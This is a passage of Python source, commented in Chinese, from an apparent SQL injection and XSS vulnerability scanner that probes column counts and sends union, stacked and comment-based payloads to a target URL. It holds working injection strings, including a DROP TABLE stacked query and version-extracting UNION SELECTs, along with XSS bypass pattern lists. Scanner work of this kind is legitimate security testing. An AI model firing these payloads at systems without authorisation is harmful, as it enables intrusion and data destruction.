                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data
            
            response = self.send_controlled_request(request_info)
            if response:
                return time.time() - start_time
        except:
            return float('inf')
    
    # ==================== 联合查询检测 ====================
    def detect_union_based(self, url, param_name, param_value, method, post_data, baseline):
        """
        联合查询注入检测 - 改进的列数探测和标记验证
        
        检测步骤：
        1. 多种方法探测列数（ORDER BY、UNION SELECT、GROUP BY）
        2. 验证列数的一致性
        3. 通过多个标记验证可输出的列位置
        4. 确认可以提取数据库信息
        """
        print(f"  [*] 开始联合查询注入检测")
        
        # 先探测列数（使用多种方法提高精准度）
        column_count = self._detect_column_count_advanced(url, param_name, param_value, method, post_data)
        
        print(f"  [*] 探测到列数: {column_count}")
        
        if column_count <= 0:
            return None
        
        # 尝试找到可显示的列位置
        displayable_columns = self._find_displayable_columns(
            url, param_name, param_value, method, post_data, column_count
        )
        
        print(f"  [*] 可显示列位置: {displayable_columns}")
        
        if not displayable_columns:
            return None
        
        # 使用找到的可显示列进行进一步验证
        marker = "UNION_TEST_" + str(int(time.time()))
        injectable_col = displayable_columns[0]
        
        # 构建验证payload
        select_parts = ['NULL'] * column_count
        select_parts[injectable_col] = f"'{marker}'"
        
        union_payload = f"' UNION SELECT {','.join(select_parts)}--"
        test_value = f"{param_value}{union_payload}"
        
        print(f"  [>] 测试联合查询payload: {union_payload[:50]}...")
        
        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, test_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = test_value
                request_info['data'] = data
            
            response = self.send_controlled_request(request_info)
            
            if response and 'response' in response:
                content = response['response'].get('content', '')
                
                # 检查是否找到标记
                if marker in content:
                    # 尝试获取数据库信息以确认可利用性
                    db_info = None
                    version_payload = f"' UNION SELECT {','.join(['NULL' if i != injectable_col else 'version()' for i in range(column_count)])}--"
                    version_value = f"{param_value}{version_payload}"
                    
                    version_response = self._send_request(url, param_name, version_value, method, post_data)
                    if version_response:
                        db_info = self._extract_database_info(version_response['response']['content'])
                    
                    return {
                        'type': 'Union-Based SQL Injection',
                        'confidence': '高',
                        'evidence': {
                            'column_count': column_count,
                            'displayable_columns': displayable_columns,
                            'marker_found': True,
                            'injectable_column': injectable_col,
                            'database_info': db_info
                        },
                        'payload': union_payload,
                        'technique': 'Union-based data extraction with verified column count'
                    }
                else:
                    print(f"  [-] 联合查询标记未在响应中找到")
                        
        except Exception as e:
            print(f"  [-] 联合查询检测出错: {e}")
        
        print(f"  [-] 未发现联合查询注入漏洞")
        return None
    
    def _detect_column_count_advanced(self, url, param_name, param_value, method, post_data):
        """
        高级列数探测 - 使用多种技术提高精准度
        
        方法优先级：
        1. ORDER BY法（可靠但可能被检测）
        2. UNION SELECT with NULL法（直接检测）
        3. GROUP BY法（辅助验证）
        """
        print(f"    [*] 开始列数探测...")
        
        # 方法1：使用ORDER BY探测列数
        order_by_columns = self._detect_via_order_by(url, param_name, param_value, method, post_data)
        print(f"    [*] ORDER BY法探测列数: {order_by_columns}")
        
        # 方法2：使用UNION SELECT NULL探测
        union_columns = self._detect_via_union_select(url, param_name, param_value, method, post_data)
        print(f"    [*] UNION SELECT法探测列数: {union_columns}")
        
        # 方法3：使用GROUP BY探测列数
        group_by_columns = self._detect_via_group_by(url, param_name, param_value, method, post_data)
        print(f"    [*] GROUP BY法探测列数: {group_by_columns}")
        
        # 如果两种方法结果一致，更加确定
        if order_by_columns > 0 and union_columns > 0:
            if order_by_columns == union_columns:
                return order_by_columns
            # 如果结果不一致，取更可能准确的方法（UNION）
            else:
                return union_columns
        
        # 如果只有一种方法成功，使用该结果
        if order_by_columns > 0:
            return order_by_columns
        if union_columns > 0:
            return union_columns
        if group_by_columns > 0:
            return group_by_columns
        
        return 0
    
    def _detect_via_order_by(self, url, param_name, param_value, method, post_data):
        """通过ORDER BY探测列数"""
        for i in range(1, self.sql_thresholds['union_column_max'] + 1):  # 增加到配置的最大列数
            order_payload = f"' ORDER BY {i}--"
            order_value = f"{param_value}{order_payload}"
            
            try:
                order_response = self._send_request(url, param_name, order_value, method, post_data)
                
                if not order_response:
                    break
                
                status = order_response['response'].get('status_code', 500)
                content = order_response['response'].get('content', '')
                
                # 如果是语法错误或500错误，说明列数过多
                if status >= 400 or self._check_for_database_errors(content):
                    return max(0, i - 1)  # 返回最后一个成功的列数
            except:
                break
        
        return 0
    
    def _detect_via_union_select(self, url, param_name, param_value, method, post_data):
        """通过UNION SELECT NULL探测列数"""
        for i in range(1, self.sql_thresholds['union_column_max'] + 1):  # 增加到配置的最大列数
            null_list = ['NULL'] * i
            union_payload = f"' UNION SELECT {','.join(null_list)}--"
            union_value = f"{param_value}{union_payload}"
            
            try:
                union_response = self._send_request(url, param_name, union_value, method, post_data)
                
                if not union_response:
                    break
                
                status = union_response['response'].get('status_code', 500)
                content = union_response['response'].get('content', '')
                
                # 检查是否有语法错误
                error = self._check_for_database_errors(content)
                
                # 有两种情况表示成功：
                # 1. 没有语法错误且返回200
                # 2. 响应内容变化表示成功注入
                if status == 200 and not error:
                    # 检查响应是否与基准不同
                    baseline_key = f"{url}_{param_name}_{method}"
                    if baseline_key in self.baseline_responses:
                        baseline_content = self.baseline_responses[baseline_key]['content']
                        similarity = self._calculate_similarity(baseline_content, content)
                        if similarity < 0.9:  # 响应内容有明显变化
                            return i
                    else:
                        return i
                elif status >= 400 or error:
                    # 语法错误表示列数不对
                    return max(0, i - 1)
            except:
                break
        
        return 0
    
    def _detect_via_group_by(self, url, param_name, param_value, method, post_data):
        """通过GROUP BY探测列数"""
        for i in range(1, self.sql_thresholds['union_column_max'] + 1):
            group_payload = f"' GROUP BY {i}--"
            group_value = f"{param_value}{group_payload}"
            
            try:
                group_response = self._send_request(url, param_name, group_value, method, post_data)
                
                if not group_response:
                    break
                
                status = group_response['response'].get('status_code', 500)
                content = group_response['response'].get('content', '')
                
                # 如果是语法错误或500错误，说明列数过多
                if status >= 400 or self._check_for_database_errors(content):
                    return max(0, i - 1)
            except:
                break
        
        return 0
    
    def _find_displayable_columns(self, url, param_name, param_value, method, post_data, column_count):
        """
        找到可在页面显示的列位置
        
        返回：
            list: 可显示的列索引列表，按优先级排序
        """
        displayable = []
        
        # 尝试每个列位置用一个唯一的标记
        for col_idx in range(min(column_count, 8)):  # 最多检查8列
            marker = f"COL_{col_idx}_{int(time.time())}"
            select_parts = []
            
            for i in range(column_count):
                if i == col_idx:
                    select_parts.append(f"'{marker}'")
                else:
                    select_parts.append('NULL')
            
            test_payload = f"' UNION SELECT {','.join(select_parts)}--"
            test_value = f"{param_value}{test_payload}"
            
            try:
                response = self._send_request(url, param_name, test_value, method, post_data)
                
                if response and marker in response['response'].get('content', ''):
                    displayable.append(col_idx)
            except:
                pass
        
        return displayable if displayable else list(range(min(column_count, 3)))

    def _send_request(self, url, param_name, param_value, method, post_data):
        """发送请求的通用方法"""
        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data
            
            return self.send_controlled_request(request_info)
        except:
            return None

    def _calculate_similarity(self, text1, text2):
        """
        计算两个文本的相似度 - 使用Levenshtein距离
        基于difflib的SequenceMatcher实现，比简单set比较更精准
        """
        from difflib import SequenceMatcher
        
        # 确保两个参数都是字符串
        if not isinstance(text1, str):
            if text1 is None:
                text1 = ''
            else:
                text1 = str(text1)

        if not isinstance(text2, str):
            if text2 is None:
                text2 = ''
            else:
                text2 = str(text2)

        if not text1 or not text2:
            return 0
        
        # 对较长的文本进行采样以提高性能
        # 取前1000字符和后500字符（避免遗漏HTML尾部变化）
        sample_size = 1500
        if len(text1) > sample_size:
            text1_sample = text1[:1000] + text1[-500:]
        else:
            text1_sample = text1
            
        if len(text2) > sample_size:
            text2_sample = text2[:1000] + text2[-500:]
        else:
            text2_sample = text2
        
        # 使用SequenceMatcher计算匹配比例（更准确的相似度）
        # ratio()返回0-1之间的值，2*M/(T+S)其中M是匹配字符数
        matcher = SequenceMatcher(None, text1_sample, text2_sample)
        similarity = matcher.ratio()
        
        # 也考虑内容长度的差异作为补充判断
        # 如果长度差异很大，即使字符相似，也认为有差异
        length_ratio = min(len(text1_sample), len(text2_sample)) / max(len(text1_sample), len(text2_sample)) if max(len(text1_sample), len(text2_sample)) > 0 else 0
        
        # 综合相似度 = 字符相似度 * 长度相似度权重
        # 这样既考虑内容又考虑长度变化
        weighted_similarity = (similarity * 0.7 + length_ratio * 0.3)
        
        return weighted_similarity

    def _extract_database_info(self, response_text):
        """从响应中提取可能的数据库信息"""
        patterns = {
            'mysql': r"[\d\.]+-MySQL",
            'postgresql': r"PostgreSQL [\d\.]+",
            'mssql': r"Microsoft SQL Server [\d\.]+",
            'oracle': r"Oracle Database [\d\.]+",
            'sqlite': r"SQLite [\d\.]+"
        }
        
        for db_type, pattern in patterns.items():
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return {
                    'type': db_type,
                    'version': match.group(0)
                }
        
        return None

    # ==================== 堆叠查询检测 ====================
    def detect_stacked_queries(self, url, param_name, param_value, method, post_data):
        """堆叠查询检测（支持多语句执行）"""
        print(f"  [*] 开始堆叠查询检测")
        
        stacked_payloads = self.sql_payloads.get("stacked", [])
        
        if not stacked_payloads:
            # 如果没有配置的堆叠payload，使用默认的
            stacked_payloads = [
                {"payload": "'; SELECT 'stacked'--", "database": "generic"},
                {"payload": "'; WAITFOR DELAY '00:00:02'--", "database": "mssql"},
                {"payload": "'; DROP TABLE IF EXISTS test_table--", "database": "generic"}
            ]
        
        # 先获取基准响应
        baseline = self.get_baseline_response(url, param_name, param_value, method, post_data)
        
        for payload_info in stacked_payloads[:8]:  # 增加测试数量
            payload = payload_info.get("payload", "")
            db_type = payload_info.get("database", "generic")
            
            print(f"  [>] 测试堆叠查询payload: {payload[:50]}...")
            
            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data
                
                response = self.send_controlled_request(request_info)
                
                if response and 'response' in response:
                    content = response['response'].get('content', '')
                    
                    # 检查响应中是否有堆叠查询的特征
                    if self._check_stacked_indicator(content):
                        # 验证：发送不包含堆叠的payload
                        safe_value = f"{param_value}' AND '1'='1"
                        safe_response = self._send_request(url, param_name, safe_value, method, post_data)
                        
                        if safe_response and response['response']['content'] != safe_response['response']['content']:
                            return {
                                'type': 'Stacked Queries SQL Injection',
                                'payload': payload,
                                'database': db_type,
                                'confidence': '中',
                                'evidence': 'Stacked query indicator found',
                                'technique': 'Multiple statement execution'
                            }
                    # 另外，检查响应内容是否与基准明显不同
                    elif baseline and self._calculate_similarity(baseline['content'], content) < 0.7:
                        # 堆叠查询可能导致完全不同的响应
                        return {
                            'type': 'Stacked Queries SQL Injection (Response Changed)',
                            'payload': payload,
                            'database': db_type,
                            'confidence': '低',
                            'evidence': 'Response significantly different from baseline',
                            'technique': 'Multiple statement execution with response change'
                        }
                            
            except Exception as e:
                print(f"  [-] 堆叠查询测试出错: {e}")
                continue
        
        print(f"  [-] 未发现堆叠查询注入漏洞")
        return None

    def _check_stacked_indicator(self, response_text):
        """检查堆叠查询的指示器"""
        indicators = [
            "stacked",
            "multiple statements",
            "batch execution",
            "xp_cmdshell",
            "command executed",
            "waitfor",
            "sleep",
            "delay"
        ]
        
        for indicator in indicators:
            if indicator.lower() in response_text.lower():
                return True
        
        return False


    def check_sql_injection(self, url, param_name=None, param_value=None, method="GET", post_data=None, auto_detect_params=True):
        """
        全面的SQL注入检测入口
    
        Args:
            url: 目标URL
            param_name: 参数名（可选，如为空且auto_detect_params=True则自动测试多个参数）
            param_value: 参数值（可选，默认为1）
            method: HTTP方法
            post_data: POST数据
            auto_detect_params: 是否自动检测参数（默认开启）
    
        Returns:
            tuple: (漏洞列表, 扫描结果统计)
        """
        # 确保url是字符串类型
        if isinstance(url, list):
            print(f"⚠️  警告: url参数是列表类型，将使用第一个元素")
            if url:
                url = url[0]
            else:
                print(f"❌ 错误: url列表为空")
                return [], self.results

        if not isinstance(url, str):
            print(f"❌ 错误: url参数必须是字符串，但得到 {type(url)}")
            return [], self.results

        # 确保url是有效的URL格式
        if not url.startswith(('http://', 'https://')):
            print(f"⚠️  警告: URL缺少协议，添加http://")
            url = f"http://{url}"
        
        print_colored(f"\n{'='*60}","yellow")
        print_colored(f"\n🔍 开始全面检测SQL注入: {url}","red")
        print_colored(f"\n{'='*60}","yellow")
        if param_name and param_value:
            print(f"   参数: {param_name} = {param_value}")
        print(f"   方法: {method}")

        vulnerabilities = []

        try:
            # 获取基准响应（用于后续对比）
            baseline = self.get_baseline_response(url, param_name or "id", param_value or "1", method, post_data)
            
            if not baseline:
                print("❌ 无法获取基准响应，停止检测")
                return [], self.results

            print(f"[*] 基准响应状态: {baseline['status']}, 长度: {baseline['length']}")

            # 1. 基于错误的检测
            print("\n[1/6] 基于错误的注入检测...")
            error_result = self.detect_error_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
            if error_result:
                print(f"✅ 发现错误型注入漏洞!")
                vulnerabilities.append(self._format_vulnerability(error_result, url, param_name, method))

            # 2. 布尔盲注检测
            print("\n[2/6] 布尔盲注检测...")
            boolean_result = self.detect_boolean_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
            if boolean_result:
                print(f"✅ 发现布尔盲注漏洞!")
                vulnerabilities.append(self._format_vulnerability(boolean_result, url, param_name, method))

            # 3. 时间盲注检测
            print("\n[3/6] 时间盲注检测...")
            time_result = self.detect_time_based(url, param_name or "id", param_value or "1", method, post_data)
            if time_result:
                print(f"✅ 发现时间盲注漏洞!")
                vulnerabilities.append(self._format_vulnerability(time_result, url, param_name, method))

            # 4. 联合查询检测
            print("\n[4/6] 联合查询注入检测...")
            union_result = self.detect_union_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
            if union_result:
                print(f"✅ 发现联合查询注入漏洞!")
                vulnerabilities.append(self._format_vulnerability(union_result, url, param_name, method))

            # 5. 堆叠查询检测
            print("\n[5/6] 堆叠查询检测...")
            stacked_result = self.detect_stacked_queries(url, param_name or "id", param_value or "1", method, post_data)
            if stacked_result:
                print(f"✅ 发现堆叠查询注入漏洞!")
                vulnerabilities.append(self._format_vulnerability(stacked_result, url, param_name, method))

            # 6. 注释型注入检测
            print("\n[6/6] 注释型注入检测...")
            comment_result = self.detect_comment_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
            if comment_result:
                print(f"✅ 发现注释型注入漏洞!")
                vulnerabilities.append(self._format_vulnerability(comment_result, url, param_name, method))

            # 更新统计信息
            self.update_sql_statistics(vulnerabilities)

            print(f"\n{'='*60}")
            print(f"扫描完成！")
            print(f"发现漏洞: {len(vulnerabilities)}")

            # 输出漏洞信息
            if vulnerabilities:
                print(f"\n漏洞详情:")
                for i, vuln in enumerate(vulnerabilities, 1):
                    print(f"{i}. URL: {vuln['url']}")
                    print(f"   类型: {vuln['type']}")
                    print(f"   参数: {vuln.get('parameter', param_name or 'N/A')}")
                    print(f"   方法: {vuln['method']}")
                    print(f"   可信度: {vuln['confidence']}")
                    if 'evidence' in vuln:
                        print(f"   证据: {vuln['evidence'][:100] if isinstance(vuln['evidence'], str) else '见详细数据'}")
                    if 'payload' in vuln:
                        print(f"   Payload: {vuln['payload'][:80]}")

            # 更新全局结果
            self.results['vulnerabilities'].extend(vulnerabilities)

            return vulnerabilities, self.results

        except Exception as e:
            print(f"❌ SQL注入检测过程中发生错误: {e}")
            import traceback
            traceback.print_exc()
            return [], self.results

    def _format_vulnerability(self, detection_result, url, param_name, method):
        """
        格式化检测结果为统一漏洞格式
        """
        # 提取检测结果中的关键信息
        vuln_type_map = {
            'error_based': 'Error-based SQL Injection',
            'boolean_based': 'Boolean-based Blind SQL Injection',
            'time_based': 'Time-based Blind SQL Injection',
            'union_based': 'Union-based SQL Injection',
            'stacked_queries': 'Stacked Queries SQL Injection',
            'out_of_band': 'Out-of-band SQL Injection',
            'comment_based': 'Comment-based SQL Injection'
        }

        # 如果检测结果已经是字典格式，直接使用或转换
        if isinstance(detection_result, dict):
            # 确保有必要的字段
            vuln = detection_result.copy()
            vuln['url'] = url

            # 设置或确保参数名
            if 'parameter' not in vuln and param_name:
                vuln['parameter'] = param_name

            # 设置或确保方法
            if 'method' not in vuln:
                vuln['method'] = method

            # 确保有类型字段
            if 'type' not in vuln and 'detection_type' in vuln:
                detection_type = vuln.get('detection_type', '').lower()
                vuln['type'] = vuln_type_map.get(detection_type, f"SQL Injection ({detection_type})")
            elif 'type' not in vuln:
                vuln['type'] = 'SQL Injection'

            # 确保有可信度字段
            if 'confidence' not in vuln and 'certainty' in vuln:
                vuln['confidence'] = vuln['certainty']
            elif 'confidence' not in vuln:
                vuln['confidence'] = '中'

            return vuln
        else:
            # 如果不是字典格式，创建标准格式
            return {
                'url': url,
                'type': 'SQL Injection',
                'parameter': param_name or 'unknown',
                'method': method,
                'confidence': '中',
                'description': str(detection_result)
            }

    def detect_comment_based(self, url, param_name, param_value, method, post_data, baseline):
        """注释型SQL注入检测"""
        print(f"  [*] 开始注释型注入检测")
        
        comment_payloads = self.sql_payloads.get("comment_based", [])
        
        if not comment_payloads:
            comment_payloads = [
                {"payload": "' OR '1'='1' --", "database": "generic"},
                {"payload": "' OR '1'='1' #", "database": "mysql"},
                {"payload": "' OR '1'='1' /*", "database": "generic"},
                {"payload": "' AND '1'='1' --", "database": "generic"},
                {"payload": "' UNION SELECT NULL --", "database": "generic"}
            ]
        
        # 测试基本的注释绕过
        basic_payloads = [
            ("' OR '1'='1' --", "generic"),
            ("' OR '1'='1' #", "mysql"),
            ("' OR '1'='1' /*", "generic")
        ]
        
        for payload, db_type in basic_payloads:
            print(f"  [>] 测试注释payload: {payload[:50]}...")
            
            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data
                
                response = self.send_controlled_request(request_info)
                
                if response and 'response' in response:
                    content = response['response'].get('content', '')
                    
                    # 检查响应是否与基准不同
                    if baseline and self._calculate_similarity(baseline['content'], content) < 0.8:
                        # 检查是否包含注入成功特征
                        if self._check_injection_success(content, baseline['content']):
                            return {
                                'type': 'Comment-Based SQL Injection',
                                'payload': payload,
                                'database': db_type,
                                'confidence': '中',
                                'evidence': 'Response changed significantly with comment payload',
                                'technique': 'Comment-based injection bypass'
                            }
                            
            except Exception as e:
                continue
        
        # 测试配置文件中的payload
        for payload_info in comment_payloads[:5]:
            payload = payload_info.get("payload", "")
            db_type = payload_info.get("database", "generic")
            
            print(f"  [>] 测试注释payload: {payload[:50]}...")
            
            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data
                
                response = self.send_controlled_request(request_info)
                
                if response and 'response' in response:
                    content = response['response'].get('content', '')
                    
                    # 检查响应是否与基准不同
                    if baseline and self._calculate_similarity(baseline['content'], content) < 0.8:
                        # 检查是否包含注入成功特征
                        if self._check_injection_success(content, baseline['content']):
                            return {
                                'type': 'Comment-Based SQL Injection',
                                'payload': payload,
                                'database': db_type,
                                'confidence': '中',
                                'evidence': 'Response changed significantly with comment payload',
                                'technique': 'Comment-based injection bypass'
                            }
                            
            except Exception as e:
                continue
        
        print(f"  [-] 未发现注释型注入漏洞")
        return None
    
    def _check_injection_success(self, response_content, baseline_content):
        """检查注入是否成功"""
        # 简单的成功检查：内容有明显变化
        similarity = self._calculate_similarity(response_content, baseline_content)
        
        # 检查常见注入成功特征
        success_indicators = [
            "welcome",
            "success",
            "logged in",
            "login successful",
            "admin",
            "dashboard",
            "profile"
        ]
        
        for indicator in success_indicators:
            if indicator in response_content.lower() and indicator not in baseline_content.lower():
                return True
        
        # 如果相似度很低，也可能表示注入成功
        return similarity < 0.6

    def detect_out_of_band(self, url, param_name, param_value, method, post_data):
        """
        带外数据检测（DNS/HTTP）
        
        注意：OOB检测在本地环境中难以验证，因需要外部DNS/HTTP日志。
        在没有真实OOB通道验证的情况下，此检测易产生严重误报。
        建议：仅在有可信的OOB日志记录系统时启用此检测。
        当前：默认禁用以减少误报。
        """
        # OOB检测禁用 - 防止严重误报
        # 原因：无法在本地验证带外通道，任何"请求成功"都会触发误报
        # 真实环境中应使用专业OOB服务（如http://Interactsh）
        return None

    def evaluate_sql_results(self, detection_results, baseline):
        """综合评估SQL注入检测结果"""
        if not detection_results:
            return {
                'vulnerable': False,
                'confidence': 'None',
                'summary': 'No SQL injection vulnerabilities detected'
            }
        
        # 按可信度排序
        confidence_map = {'High': 3, 'Medium-High': 2.5, 'Medium': 2, 'Low-Medium': 1.5, 'Low': 1}
        
        # 计算平均可信度
        total_weight = 0
        total_confidence = 0
        
        for result in detection_results:
            weight = confidence_map.get(result.get('confidence', 'Low'), 1)
            total_weight += weight
            total_confidence += weight * confidence_map.get(result['confidence'], 1)
        
        avg_confidence = total_confidence / total_weight if total_weight > 0 else 0
        
        # 确定最终结论
        if avg_confidence >= 2.5:  # High or Medium-High
            verdict = 'Definitely Vulnerable'
            confidence = 'High'
        elif avg_confidence >= 1.5:  # Medium
            verdict = 'Likely Vulnerable'
            confidence = '中'
        else:
            verdict = 'Potentially Vulnerable'
            confidence = 'Low'
        
        # 收集发现的漏洞类型
        vuln_types = set(r['type'] for r in detection_results)
        
        return {
            'vulnerable': True,
            'confidence': confidence,
            'verdict': verdict,
            'detected_types': list(vuln_types),
            'total_findings': len(detection_results),
            'details': detection_results
        }

    def update_sql_statistics(self, vulnerabilities):
        """更新SQL注入统计信息"""
        stats = self.results['sql_statistics']
        
        if not vulnerabilities:
            return
        
        # 获取唯一的URL列表
        unique_urls = set()
        for vuln in vulnerabilities:
            if 'url' in vuln:
                unique_urls.add(vuln['url'])
            elif 'tested_url' in vuln:
                unique_urls.add(vuln['tested_url'])
        
        stats["total_tested"] = len(unique_urls)
        stats["vulnerable_urls"] = len(unique_urls)
        
        # 按类型统计
        for vuln in vulnerabilities:
            vuln_type = vuln["type"].split("(")[-1].split(")")[0] if "(" in vuln["type"] else vuln["type"]
            stats["by_type"][vuln_type] = stats["by_type"].get(vuln_type, 0) + 1
            
            # 按数据库类型统计
            db_type = vuln.get("database", "unknown")
            if not db_type or db_type == "unknown":
                db_type = vuln.get("database_type", "unknown")
            stats["by_database"][db_type] = stats["by_database"].get(db_type, 0) + 1
            
            # 按请求方法统计
            method = vuln.get("method", "unknown")
            stats["by_method"][method] = stats["by_method"].get(method, 0) + 1

    # ==================== XSS检测功能 ====================
    def _extract_parameters(self, url):
        """从URL中提取参数"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # 转换为单个值的字典（而不是列表）
        single_params = {}
        for key, value in params.items():
            if value:
                single_params[key] = value[0]
        
        return single_params

    def _detect_xss_in_response(self, response_text, payload, original_value=None):
        """
        增强的XSS漏洞检测：支持多种编码、上下文检测、多层验证
        
        改进点：
        1. 优先检查原始payload反射 - 避免过度的编码检测导致漏报
        2. 智能编码检测 - 只在适当情况下进行
        3. 更精准的危险等级判断 (考虑payload执行的实际可能性)
        4. 减少误报 (排除明显的防护场景)
        """
        if not response_text or not payload:
            return False, "无", "输入为空"
        
        response_lower = response_text.lower()
        payload_lower = payload.lower()
        
        # 优先检查未转义的直接反射
        payload_reflected = payload_lower in response_lower
        
        # 检查HTML实体或数字实体转义的反射（例如 &lt;script&gt;）
        encoded_reflected = False
        try:
            unescaped = _html.unescape(response_text)
            if payload_lower in unescaped.lower():
                encoded_reflected = True
        except Exception:
            unescaped = response_text
        
        if not payload_reflected and not encoded_reflected:
            return False, "无", "Payload未在响应中反射"
        
        # 防止误报：某些页面会在HTML注释或错误信息中出现脚本字符
        # 比如说所有响应都是登录页面的情况
        # 如果响应和基准几乎完全相同，说明参数根本没有被处理
        # 这里就不需要继续分析了
        response_len = len(response_text)
        if response_len < 100:
            # 响应过短，可能是错误页面
            return False, "无", "响应内容过短，可能是错误页面"
        
        # ==================== 第二层：Payload位置和上下文分析 ====================
        # 使用未转义文本进行定位（若检测到encoded_reflected则使用unescaped）
        search_text = unescaped if encoded_reflected else response_text
        search_lower = search_text.lower()
        
        # 找出所有payload反射的位置
        payload_positions = []
        search_pos = 0
        while True:
            pos = search_lower.find(payload_lower, search_pos)
            if pos == -1:
                break
            payload_positions.append(pos)
            search_pos = pos + 1
        
        if not payload_positions:
            return False, "无", "无法定位Payload位置"
        
        # 分析主要反射点的上下文 (取第一个位置)
        main_pos = payload_positions[0]
        context_start = max(0, main_pos - 150)
        context_end = min(len(response_text), main_pos + len(payload) + 150)
        context = response_text[context_start:context_end]
        context_lower = context.lower()
        
        # ==================== 第三层：检测Payload所在的上下文类型 ====================
        # 检测Payload是否在HTML标签内部（< >之间）
        before_context = response_text[max(0, main_pos - 200):main_pos]
        after_context = response_text[main_pos + len(payload):min(len(response_text), main_pos + len(payload) + 200)]
        
        # 统计前后的<和>
        open_brackets_before = before_context.count('<') - before_context.count('>')
        
        # 判断Payload是否在标签属性中
        in_html_tag = open_brackets_before > 0
        
        # 更精准的上下文识别
        is_in_script_tag = '<script' in context_lower
        is_in_event_handler = any(f'{event}=' in context_lower for event in 
                                  ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 
                                   'onchange', 'onkeydown', 'onkeyup', 'ondblclick'])
        is_in_attr_value = in_html_tag and not is_in_script_tag
        is_in_style_tag = '<style' in context_lower or 'style=' in context_lower
        is_in_comment = '<!--' in context_lower or '-->' in context_lower
        is_in_data_uri = 'data:' in context_lower or 'javascript:' in context_lower
        
        # ==================== 第四层：危险等级和可执行性判断 ====================
        danger_level = "低"
        reason = ""
        is_exploitable = False  # 默认不可执行，除非满足特定条件
        
        # 排除明显的防护场景
        if is_in_comment:
            reason = "Payload在HTML注释中，不可执行"
            return False, "无", reason
        
        # 检查Payload中是否包含执行特征
        has_exec_chars = any(char in payload for char in ['<', 'script', 'on', '(', ')'])
        
        # 只有包含执行特征的payload才可能可执行
        if not has_exec_chars:
            return False, "无", "Payload缺少执行特征，不构成XSS漏洞"
        
        # 高危判断：只有在特定上下文中才认为可执行
        if is_in_script_tag:
            danger_level = "高"
            reason = "Payload在<script>标签内，将直接执行"
            is_exploitable = True
        elif is_in_event_handler:
            danger_level = "高"
            reason = "Payload在事件处理器中，可直接触发执行"
            is_exploitable = True
        elif is_in_data_uri:
            danger_level = "高"
            reason = "Payload使用data: 或 javascript: URI，可绕过CSP"
            is_exploitable = True
        elif '<' in payload and is_in_attr_value:
            # 检查是否能从属性值逃逸
            if '"' in context_lower or "'" in context_lower:
                danger_level = "高"
                reason = "可能从属性值逃逸执行"
                is_exploitable = True
            else:
                danger_level = "中"
                reason = "在属性值内，可能存在逃逸可能"
                is_exploitable = True
        elif is_in_style_tag:
            danger_level = "中"
            reason = "Payload在样式上下文，可能执行表达式"
            is_exploitable = True
        elif in_html_tag:
            danger_level = "中"
            reason = "Payload在HTML标签内反射"
            is_exploitable = True
        else:
            # 文本内容中反射的script标签不会执行
            danger_level = "低"
            reason = "Payload在纯文本内容中反射，无法执行"
            is_exploitable = False
        
        # ==================== 第五层：特殊绕过技巧检测 ====================
        bypass_patterns = [
            ('javascript:', '伪协议'),
            ('data:', '数据URI协议'),
            ('vbscript:', 'VB伪协议'),
            ('<img', '图片标签'),
            ('<svg', 'SVG标签'),
            ('<iframe', 'IFrame标签'),
            ('<embed', '嵌入标签'),
            ('<object', '对象标签'),
            ('eval(', 'eval函数'),
            ('innerhtml', '动态HTML'),
            ('outerhtml', '外层HTML'),
            ('srcdoc=', 'srcdoc属性'),
            ('onload=', 'onload事件'),
            ('onerror=', 'onerror事件'),
            ('src=', 'src属性'),
        ]
        
        for pattern, bypass_type in bypass_patterns:
            if pattern in payload_lower:
                danger_level = "高"
                reason = f"检测到XSS绕过技巧: {bypass_type}"
                is_exploitable = True
                break
        
        # ==================== 第六层：综合验证 ====================
        # 如果Payload反射位置多个，可能存在多个反射点
        reflection_count = len(payload_positions)
        
        # 多次反射增加危险等级
        if reflection_count > 2 and danger_level == "低":
            danger_level = "中"
            reason = f"Payload多次反射({reflection_count}次)，增加绕过可能"
        
        # 如果payload包含多个危险关键字
        dangerous_keywords = ['script', '<', '>', 'on', 'eval', 'alert']
        keyword_count = sum(1 for keyword in dangerous_keywords if keyword in payload_lower)
